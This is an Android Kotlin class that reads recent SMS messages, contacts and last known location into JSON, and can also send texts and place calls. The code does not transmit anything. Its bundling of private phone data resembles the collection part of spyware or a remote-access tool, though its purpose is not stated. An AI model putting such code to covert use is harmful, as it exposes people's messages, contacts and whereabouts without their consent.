package com.example.localutility

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.location.LocationManager
import android.net.Uri
import android.provider.ContactsContract
import android.provider.Telephony
import android.telephony.SmsManager
import org.json.JSONArray
import org.json.JSONObject

class TelephonyAndLocationManager(private val context: Context) {

    fun getRecentSms(): JSONArray {
        val array = JSONArray()
        try {
            val cursor = context.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE, Telephony.Sms.TYPE),
                null, null, "${Telephony.Sms.DATE} DESC LIMIT 50"
            )
            cursor?.use {
                val addrIdx = it.getColumnIndex(Telephony.Sms.ADDRESS)
                val bodyIdx = it.getColumnIndex(Telephony.Sms.BODY)
                val dateIdx = it.getColumnIndex(Telephony.Sms.DATE)
                val typeIdx = it.getColumnIndex(Telephony.Sms.TYPE)

                while (it.moveToNext()) {
                    val obj = JSONObject().apply {
                        put("address", if (addrIdx >= 0) it.getString(addrIdx) else "")
                        put("body", if (bodyIdx >= 0) it.getString(bodyIdx) else "")
                        put("date", if (dateIdx >= 0) it.getLong(dateIdx) else 0L)
                        put("type", if (typeIdx >= 0 && it.getInt(typeIdx) == Telephony.Sms.MESSAGE_TYPE_INBOX) "inbox" else "sent")
                    }
                    array.put(obj)
                }
            }
        } catch (e: Exception) { e.printStackTrace() }
        return array
    }

    fun sendSms(to: String, message: String): Boolean {
        return try {
            val smsManager = context.getSystemService(SmsManager::class.java)
            smsManager.sendTextMessage(to, null, message, null, null)
            true
        } catch (e: Exception) {
            e.printStackTrace()
            false
        }
    }

    fun getContacts(): JSONArray {
        val array = JSONArray()
        try {
            val cursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER),
                null, null, "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
            )
            cursor?.use {
                val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (it.moveToNext()) {
                    val obj = JSONObject().apply {
                        put("name", if (nameIdx >= 0) it.getString(nameIdx) else "Unknown")
                        put("number", if (numIdx >= 0) it.getString(numIdx) else "")
                    }
                    array.put(obj)
                }
            }
        } catch (e: Exception) { e.printStackTrace() }
        return array
    }

    @SuppressLint("MissingPermission")
    fun getLocation(): JSONObject {
        val obj = JSONObject()
        try {
            val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER) 
                ?: locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            
            if (location != null) {
                obj.put("lat", location.latitude)
                obj.put("lng", location.longitude)
                obj.put("accuracy", location.accuracy)
                obj.put("timestamp", location.time)
            } else {
                obj.put("error", "Location not available")
            }
        } catch (e: Exception) {
            obj.put("error", e.message)
        }
        return obj
    }

    @SuppressLint("MissingPermission")
    fun makeCall(number: String) {
        try {
            val intent = Intent(Intent.ACTION_CALL, Uri.parse("tel:$number")).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            context.startActivity(intent)
        } catch (e: Exception) { e.printStackTrace() }
    }
}